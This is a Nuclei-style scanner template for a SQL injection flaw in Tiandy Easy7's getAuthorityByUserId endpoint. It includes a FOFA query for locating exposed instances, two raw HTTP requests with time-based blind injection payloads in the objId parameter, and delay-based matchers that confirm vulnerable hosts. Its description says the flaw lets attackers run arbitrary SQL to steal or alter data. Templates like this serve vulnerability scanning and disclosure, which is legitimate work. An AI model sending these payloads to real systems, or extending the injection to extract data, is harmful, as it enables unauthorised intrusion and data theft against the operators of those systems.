id: tian-di-wei-ye-easy7-getauthoritybyuserid-sql-injection
info:
  name: 天地伟业Easy7 getAuthorityByUserId SQL注入
  author: 0dayPoc
  severity: high
  description: |-
    fofa: web.body="./jsapi/js/bootstrap/js/bootstrap.min.js"
    该漏洞源于 getAuthorityByUserId 接口对用户输入参数缺乏有效过滤，导致 SQL 注入风险。攻击者可利用此缺陷执行任意 SQL 命令，进而窃取或篡改数据库中的敏感数据，严重威胁系统安全。
  tags: 天地伟业Easy7
http:
- raw:
  - |
    GET /Easy7/rest/user/getAuthorityByUserId?userId=&objId=a'and(select*from(select+sleep(5))a+union+select+1)='&authTypes.authTypes=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  - |
    GET /Easy7/rest/user/getAuthorityByUserId?userId=&objId=a'and(select*from(select+sleep(8))a+union+select+1)='&authTypes.authTypes=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
